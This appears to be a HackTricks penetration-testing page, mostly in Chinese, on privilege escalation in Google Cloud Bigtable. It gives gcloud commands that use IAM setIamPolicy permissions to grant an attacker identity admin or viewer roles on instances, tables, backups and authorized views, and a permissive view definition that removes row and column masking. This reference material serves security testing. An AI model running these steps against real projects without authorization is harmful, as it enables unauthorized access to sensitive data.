# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

有关 Bigtable 的更多信息，请参阅：

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**权限：** `bigtable.instances.setIamPolicy`（通常还需要 `bigtable.instances.getIamPolicy` 来读取当前绑定）。

拥有实例的 IAM 策略允许你授予自己 **`roles/bigtable.admin`**（或任何自定义角色），该权限会级联到实例中的每个集群、表、备份和授权视图。

<details><summary>在实例上授予自己 bigtable.admin 角色</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> 如果你无法列出现有的 bindings，编写一个新的 policy 文档并使用 `gcloud bigtable instances set-iam-policy` 推送它，只要确保自己仍在其中即可。

获取此权限后，请查看 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 中的技术，以了解更多滥用 Bigtable 权限的方法。

### `bigtable.tables.setIamPolicy`

**权限：** `bigtable.tables.setIamPolicy` (可选 `bigtable.tables.getIamPolicy`)。

Instance policies can be locked down while individual tables are delegated. If you can edit the table IAM you can **promote yourself to owner of the target dataset** without touching other workloads.

<details><summary>Grant yourself bigtable.admin role on table</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

在获得此权限后，请查看 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 中的技术，了解更多滥用 Bigtable 权限的方法。


### `bigtable.backups.setIamPolicy`

**Permissions:** `bigtable.backups.setIamPolicy`

备份可以恢复到你控制的任意项目中的任意实例。首先，赋予你的身份对该备份的访问权限，然后将其恢复到你拥有 Admin/Owner 角色的沙箱中。

如果你拥有 `bigtable.backups.setIamPolicy` 权限，你可以授予自己 `bigtable.backups.restore` 权限，以恢复旧的备份并尝试访问敏感信息。

<details><summary>获取备份快照所有权</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

在查看 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 中关于如何恢复备份的内容后，进行此权限检查。


### 更新 authorized view

**Permissions:** `bigtable.authorizedViews.update`

Authorized Views 用于对行/列进行脱敏。修改或删除它们会**移除防御方所依赖的细粒度保护措施**。

<details><summary>将 authorized view 更新以扩大访问范围</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

在获得此权限后，请参考 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 了解如何从授权视图读取数据。

### `bigtable.authorizedViews.setIamPolicy`

**权限：**  `bigtable.authorizedViews.setIamPolicy`.

具有此权限的攻击者可以为自己授予对授权视图 (Authorized View) 的访问权限，该视图可能包含他们原本无法访问的敏感数据。

<details><summary>为自己授予对授权视图的访问权限</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

在进行此权限检查并查看 [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) 中关于如何从授权视图读取的内容之后。

{{#include ../../../banners/hacktricks-training.md}}
